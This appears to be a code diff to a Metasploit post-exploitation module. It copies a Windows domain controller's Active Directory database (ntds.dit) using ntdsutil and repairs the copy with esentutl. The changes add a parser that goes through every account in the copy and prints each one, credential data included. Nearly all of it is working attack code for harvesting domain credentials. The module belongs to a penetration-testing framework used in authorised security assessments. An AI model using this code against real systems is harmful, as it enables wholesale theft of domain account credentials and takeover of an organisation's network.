@@ -6,6 +6,7 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
+require 'metasploit/framework/ntds/parser'
 
 class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Registry
@@ -32,6 +33,14 @@ class Metasploit3 < Msf::Post
   def run
     if preconditions_met?
       ntds_file = copy_database_file
+      unless ntds_file.nil?
+        print_status "Repairing NTDS database after copy..."
+        print_status repair_ntds(ntds_file)
+        ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
+        ntds_parser.each_account do |ad_account|
+          print_good ad_account.to_s
+        end
+      end
     end
   end
 
@@ -65,6 +74,7 @@ class Metasploit3 < Msf::Post
     result = cmd_exec("ntdsutil.exe", command_arguments)
     if result.include? "IFM media created successfully"
       file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
+      print_status "NTDS database copied to #{file_path}"
     else
       print_error "There was an error copying the ntds.dit file!"
       file_path = nil
@@ -92,6 +102,11 @@ class Metasploit3 < Msf::Post
       status = false
     end
     return status
+  end
+
+  def repair_ntds(path='')
+    arguments = "/p /o \"#{path}\""
+    cmd_exec("esentutl", arguments)
   end
 
   def vss_method
